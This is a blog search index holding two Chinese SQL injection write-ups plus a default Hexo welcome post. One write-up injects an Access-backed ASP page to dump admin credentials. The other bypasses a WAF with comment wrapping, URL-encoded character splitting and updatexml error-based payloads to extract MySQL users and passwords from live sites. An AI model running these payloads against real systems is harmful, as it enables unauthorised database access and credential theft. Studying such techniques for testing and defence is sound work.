<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[纪录一次完整的access注入]]></title>
    <url>%2F2019%2F07%2F25%2Fthe-first-accessInjection%2F</url>
    <content type="text"><![CDATA[目标站点：https://www.xxx.com/注入点：https://www.xxx.com/common.asp?id=27 判断注入点1id=27' 1id=27+and+1=1 1id=27+and+1=0 确定这是一个注入点。 判断数据库123id=27+and+(select+count(*)+from+msysobjects)&gt;0 返回正常，则为mssql不正常，为access 确定数据库为access数据库 开始注入order by爆字段1id=27+order+by+7%00 1id=27+order+by+8%00 确定字段是7。 猜表名1id=27+and+exists(select+*+from+admin)%00 经过多次尝试（这里可以爆破）。 1id=27+and+exists(select+*+from+admin_user)%00 猜测出admin_user表。 猜列名1id=27+and+exists(select+id+from+admin_user)%00 存在id列 1id=27+and+exists(select+username+from+admin_user)%00 不存在username，多次尝试（可爆破）。得出至少有id、admin、password三列。 爆用户名，密码1id=27+union+select+1,2,3,4,5,6,7+from+admin_user%00 确定可显字段是2,3。 1id=27+union+select+1,admin,password,4,5,6,7+from+admin_user%00 最终得出账户admin以及密码（MD5解密）。]]></content>
  </entry>
  <entry>
    <title><![CDATA[纪录项目中一次简单的SQL注入bypass]]></title>
    <url>%2F2019%2F07%2F12%2Fjob-first-bypass%2F</url>
    <content type="text"><![CDATA[这篇文章是本人在项目中遇到的一个sql注入bypass的纪录。 目标站点：https://www.xxx.com/注入点：https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;classid=884 判断注入点1newsid=28671'&amp;classid=884 进一步判断 123'and 1=1 //报错'and 1='1 //不报错'and '1'='1 //不报错 最终确定了这是一个注入点 获取信息按照常规的思路，准备先order by爆一下字段，然后在逐步爆库、表以及用户信息。 常规思路注入先手order by 123'order by 10--+ //Unknown column '10' in 'order clause'1054'order by 2--+ //Unknown column '2' in 'order clause'1054'order by 1--+ //成功 说明只有1个字段，继续进行。 123'union select user()--+ //拦截'union--+ //不拦截'union user()--+ //不拦截 这里猜测拦截了select 12345'union /*!select*/ user()--+ //拦截'union sElect user()--+ //拦截'union sel%0aect user()--+ //不拦截，但是报错'union sel%0aect user()--+ //不拦截，但是报错'union sel/**/ect user()--+ //不拦截吗，但是报错 emmmmm，到这里我已经绝望了，不得不说这后端处理写的对于我这种新手来说是真的凶残。自顾自的看了一会注入的文章，忽然发现可以采用updatexml报错注入，立刻又开始。 稍稍普及一下updatexml报错注入 12345UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 官方的东西可能说的不太接地气，直接操作一波大家就知道有什么作用了。大概就是concat将datbase(),user()等返回信息字符串化，然后因为updatexml的第二个参数需要Xpath格式的字符串,所以不符合要求，返回报错信息。 updatexml报错注入获取当前用户1234567'and updatexml(1,concat(0x3a,(select user())),1) //被拦截'and updatexml() //不拦截'and updatexml(1,concat(),1)//拦截'and updatexml(1,con%a0cat(),1)//不拦截，但是报错'and updatexml(1,con%00cat(),1)// 不拦截，但是报错'and updatexml(1,con%0acat(),1) // 不拦截，但是报错'and updatexml(1,/*!concat*/(),1)//不拦截，不报错 通过以上步骤推论waf拦截concant()函数，继续进行。 123'and updatexml(1,/*!concat*/(0x3a,(select user())),1)//拦截'and updatexml(1,/*!concat*/(0x3a,(select)),1)//拦截'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) // 不拦截 通过以上步骤推论waf还拦截了select，继续进行。 1234'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1)--+ //发现页面不响应'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) and '//拦截'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) /*!and*/ ' 成功'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1)--+//成功 获取当前数据库1'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ database())),1)--+ 获取到当前数据库和用户后，继续按照常规思路，爆库、爆表、爆字段。 爆库、爆表、爆字段123'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from information_schema.schemata limit 0,1)),1)--+ //拦截'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from /*!information_schema.schemata*/ limit 0,1)),1)--+//拦截'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/schema_name from /*!information0x5fschema.schemata*/ limit 0,1)),1)--+ //成功 虽然执行成功，但似乎限制了权限。思考了很久，正准备放弃的时候，同站点另外一个注入点吸引了我。 这里报错直接把sql语句给提示出来了，刚刚好有我们需要的表信息，二话不说，进一步尝试。 直接按照之前bypass的特点，一步到位。 1' and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ username from phome_enewsuser limit 0,1)),1)--+&amp;classid=834 1' and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ password from phome_enewsuser limit 0,1)),1)--+&amp;classid=834 总结 任何时候都不要放弃尝试，说不定试着试着就出来了。 推荐阅读：我的WafBypass之道（SQL注入篇）http://www.moonsec.com/post-299.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F07%2F09%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
